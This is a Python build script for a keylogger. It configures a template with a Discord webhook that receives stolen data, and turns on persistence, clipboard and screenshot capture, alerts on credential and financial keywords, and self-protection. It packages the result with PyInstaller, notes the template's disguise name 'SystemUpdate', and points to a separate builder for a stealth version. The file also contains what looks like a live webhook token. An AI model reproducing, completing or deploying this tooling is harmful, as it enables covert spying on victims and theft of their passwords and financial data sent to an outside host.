#!/usr/bin/env python3
"""
Quick Test Builder - Compile with console to see errors
"""

import os
import sys
import subprocess
from pathlib import Path

# CONFIGURATION - Change these values
WEBHOOK_URL = "https://discord.com/api/webhooks/1439977037195378940/otD-9nEg3aMIRqOI_egL66XUONPoE45GqoALWL5IYpDPtw4043QYQ2oxPlri60w67ysi"
SEND_INTERVAL = 60
PROGRAM_NAME = "TestKeylogger"

# Features
ENABLE_PERSISTENCE = True
ENABLE_CLIPBOARD = True
ENABLE_SCREENSHOTS = True
SCREENSHOT_INTERVAL = 300
ENABLE_KEYWORD_ALERTS = True
KEYWORD_LISTS = ['credentials', 'financial']
ENABLE_SELF_PROTECTION = True
ENABLE_HEALTH_MONITORING = True

print("[*] Quick Test Builder")
print("[*] This will create an exe WITH CONSOLE to see errors")

base_dir = Path(__file__).parent
template_file = base_dir / "keylogger_advanced.py"
output_dir = base_dir / "build"
output_dir.mkdir(exist_ok=True)

# Read template
with open(template_file, 'r', encoding='utf-8') as f:
    content = f.read()

# Replace configuration
content = content.replace('WEBHOOK_URL_PLACEHOLDER', WEBHOOK_URL)
content = content.replace('SEND_INTERVAL = 60', f'SEND_INTERVAL = {SEND_INTERVAL}')
content = content.replace('ENABLE_PERSISTENCE = False', f'ENABLE_PERSISTENCE = {ENABLE_PERSISTENCE}')
content = content.replace('ENABLE_CLIPBOARD = False', f'ENABLE_CLIPBOARD = {ENABLE_CLIPBOARD}')
content = content.replace('ENABLE_SCREENSHOTS = False', f'ENABLE_SCREENSHOTS = {ENABLE_SCREENSHOTS}')
content = content.replace('SCREENSHOT_INTERVAL = 300', f'SCREENSHOT_INTERVAL = {SCREENSHOT_INTERVAL}')
content = content.replace('ENABLE_KEYWORD_ALERTS = False', f'ENABLE_KEYWORD_ALERTS = {ENABLE_KEYWORD_ALERTS}')
content = content.replace('KEYWORD_LISTS = []', f'KEYWORD_LISTS = {KEYWORD_LISTS}')
content = content.replace('ENABLE_SELF_PROTECTION = False', f'ENABLE_SELF_PROTECTION = {ENABLE_SELF_PROTECTION}')
content = content.replace('ENABLE_HEALTH_MONITORING = False', f'ENABLE_HEALTH_MONITORING = {ENABLE_HEALTH_MONITORING}')
content = content.replace('PROGRAM_NAME = "SystemUpdate"', f'PROGRAM_NAME = "{PROGRAM_NAME}"')

# Write configured script
script_path = output_dir / "test_keylogger.py"
with open(script_path, 'w', encoding='utf-8') as f:
    f.write(content)

print(f"[+] Script created: {script_path}")

# Copy modules
import shutil
modules_src = base_dir / "modules"
modules_dst = output_dir / "modules"

if modules_dst.exists():
    shutil.rmtree(modules_dst)

shutil.copytree(modules_src, modules_dst)
print(f"[+] Modules copied")

# Build with PyInstaller - WITH CONSOLE FOR DEBUGGING
print("\n[*] Building executable WITH CONSOLE (to see errors)...")
print("[*] This may take 1-2 minutes...")

cmd = [
    sys.executable, '-m', 'PyInstaller',
    '--onefile',
    '--name', PROGRAM_NAME,
    '--distpath', str(output_dir / 'dist'),
    '--workpath', str(output_dir / 'build_temp'),
    '--specpath', str(output_dir),
    '--clean',
    '--console',  # IMPORTANT: Keep console to see errors!
    '--hidden-import', 'pynput',
    '--hidden-import', 'pynput.keyboard',
    '--hidden-import', 'requests',
    '--hidden-import', 'pyperclip',
    '--hidden-import', 'PIL',
    '--hidden-import', 'PIL.ImageGrab',
    '--hidden-import', 'psutil',
    # CRITICAL: Include modules folder!
    '--add-data', f'{str(output_dir / "modules")}{os.pathsep}modules',
    str(script_path)
]

# Add Windows imports
if sys.platform == 'win32':
    cmd.extend([
        '--hidden-import', 'win32com',
        '--hidden-import', 'win32com.client',
        '--hidden-import', 'winreg',
    ])

try:
    result = subprocess.run(cmd, check=True, cwd=str(base_dir))

    exe_path = output_dir / 'dist' / f'{PROGRAM_NAME}.exe'

    if exe_path.exists():
        print(f"\n[+] ✓ SUCCESS!")
        print(f"[+] Executable: {exe_path}")
        print(f"[+] Size: {exe_path.stat().st_size / 1024 / 1024:.2f} MB")
        print(f"\n[*] This exe has a CONSOLE WINDOW - you'll see all errors!")
        print(f"[*] Run it and watch the output:")
        print(f"    {exe_path}")
        print(f"\n[*] If it works, use builder_advanced.py to make a stealth version")
    else:
        print("[!] Executable not found!")

except Exception as e:
    print(f"[!] Build failed: {e}")
